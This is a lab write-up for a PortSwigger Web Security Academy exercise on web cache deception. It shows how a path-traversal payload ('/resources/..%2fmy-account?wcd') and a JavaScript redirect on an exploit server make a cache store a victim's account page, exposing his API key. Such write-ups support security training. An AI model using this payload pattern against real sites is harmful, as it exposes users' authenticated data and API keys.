# Lab 03: Exploiting Origin Server Normalization for Web Cache Deception

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-orange?style=for-the-badge) ![Status](https://img.shields.io/badge/Status-Solved-brightgreen?style=for-the-badge) ![Vulnerability](https://img.shields.io/badge/Vulnerability-Web%20Cache%20Deception-red?style=for-the-badge)

## 1. Lab Information

| Property | Details |
|---|---|
| Platform | PortSwigger Web Security Academy |
| Vulnerability | Web Cache Deception |
| Technique | Origin Server Normalization |
| Difficulty | Practitioner |
| Status | Solved |
| Target Endpoint | `/my-account` |
| Cache Rule | Static Directory (`/resources`) |
| Normalization | URL Decoding and Path Traversal Resolution |
| Payload | `/resources/..%2fmy-account?wcd` |

## 2. Lab Objective

Retrieve the API key belonging to the user `carlos` by exploiting differences in URL normalization between the cache server and the origin server.

## 3. Vulnerability Explanation

Web Cache Deception occurs when the cache server and origin server interpret the same URL differently.

In this lab, the origin server decodes URL-encoded characters and resolves path traversal sequences, whereas the cache server does not perform the same normalization before applying its caching rules.

Consider the following URL:

```text
/resources/..%2fmy-account
```

**Origin Server Interpretation:**

```text
Original:     /resources/..%2fmy-account
URL Decoded:  /resources/../my-account
Normalized:   /my-account
```

**Cache Server Interpretation:**

```text
/resources/..%2fmy-account
```

The cache identifies the `/resources` directory prefix and considers the request cacheable.

This creates the discrepancy:

| Component | Interpretation |
|---|---|
| Cache Server | `/resources/..%2fmy-account` |
| Origin Server | `/my-account` |

The origin returns sensitive account information, while the cache treats the response as a static resource.

## 4. Identifying the Target Endpoint

Logged into the application using:

- Username: `wiener`
- Password: `peter`

Accessed the `/my-account` endpoint and identified that the response contained my API key.

This endpoint became the target for the attack.

## 5. Investigating Path Normalization

Tested different URL paths using Burp Suite Repeater.

| Request | Response |
|---|---|
| `/my-account/abc` | 404 Not Found |
| `/my-accountabc` | 404 Not Found |
| `/aaa/..%2fmy-account` | 200 OK |

The third request returned the account information.

This demonstrated that the origin server:
1. Decoded `%2f` into `/`.
2. Resolved the `..` path segment.
3. Normalized the URL to `/my-account`.

## 6. Identifying Cache Rules

Examined static resource requests in Burp Suite Proxy HTTP history.

Identified that resources under `/resources` were being cached.

Tested the following request:

```text
/resources/aaa
```

First request:

```http
X-Cache: miss
```

Second request:

```http
X-Cache: hit
```

This confirmed that the cache applied a caching rule based on the `/resources` directory prefix.

## 7. Exploitation

Combined the origin server normalization behavior with the cache's static directory rule.

**Final Payload:**

```text
/resources/..%2fmy-account?wcd
```

The query parameter `?wcd` was used to generate a separate cache entry, assuming the query string was included in the cache key.

### Exploit Server Payload

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd";
</script>
```

### Attack Flow

1. Delivered the JavaScript through the Exploit Server.
2. Carlos visited the exploit page.
3. His browser navigated to the malicious URL.
4. The cache identified the `/resources` prefix and treated the request as cacheable.
5. The origin server decoded `%2f` and resolved the `..` segment.
6. The origin processed the request as `/my-account`.
7. Carlos's account information was returned and stored in the cache.
8. Requested the same URL to retrieve the cached response.

## 8. Retrieving Carlos's API Key

After delivering the exploit, requested the exact same URL:

```text
https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd
```

The cache returned the previously stored response containing Carlos's account information.

Extracted his API key and submitted it through the lab's Submit Solution functionality.

**Result: Lab Solved.**

## 9. Key Takeaways

- **URL Encoding:** `%2f` represents an encoded forward slash.
- **Path Traversal:** `..` represents the parent directory.
- **URL Normalization:** Servers can decode encoded characters and resolve path segments.
- **Cache Rules:** Caches can use directory prefixes to identify cacheable resources.
- **Cache Keys:** Query parameters can influence cache entry identification.
- **Cache Busting:** Unique query parameters can help generate fresh cache entries.
- **Web Cache Deception:** Inconsistent URL interpretation can cause sensitive dynamic responses to be stored in shared caches.

## 10. Conclusion

This lab demonstrated how differences in URL normalization between a cache server and an origin server can lead to Web Cache Deception.

The cache interpreted the request as belonging to the static `/resources` directory, while the origin server normalized the same URL to the sensitive `/my-account` endpoint.

By exploiting this discrepancy, I successfully caused the cache to store Carlos's authenticated account response and retrieved his API key.

**Key Lesson:** The cache server and origin server must interpret URL paths consistently. Sensitive dynamic responses should never be accidentally stored in shared caches.

## 11. References

- [PortSwigger – Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [PortSwigger – Exploiting Origin Server Normalization](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization)

---

**Disclaimer:** This repository is intended for educational purposes and authorized security testing only.
